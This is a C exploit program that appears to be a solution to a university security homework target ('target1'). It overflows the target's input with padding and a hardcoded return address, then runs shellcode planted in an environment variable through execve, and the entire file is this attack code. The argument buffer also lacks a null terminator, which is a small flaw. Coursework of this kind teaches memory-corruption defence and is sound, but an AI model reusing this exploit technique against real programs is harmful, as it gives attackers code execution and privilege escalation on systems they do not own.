#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/home/jh2422/h4/cs5435-hw4/targets/target1"

int main(void) {
    char *args[3];
    char *env[2];

    char padding[4];
    memset(padding, 'A', 4);

    char *malicious_buffer = (char *)malloc(4 + 4);
    memcpy(malicious_buffer, padding, 4);
    *(unsigned int *)(malicious_buffer + 4) = 0xffffd719;

    char shellcode_env[sizeof(shellcode) + 8];
    sprintf(shellcode_env, "SHELL=%s", shellcode);

    args[0] = TARGET;
    args[1] = malicious_buffer;
    args[2] = NULL;

    env[0] = shellcode_env;
    env[1] = NULL;

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");
    return 0;
}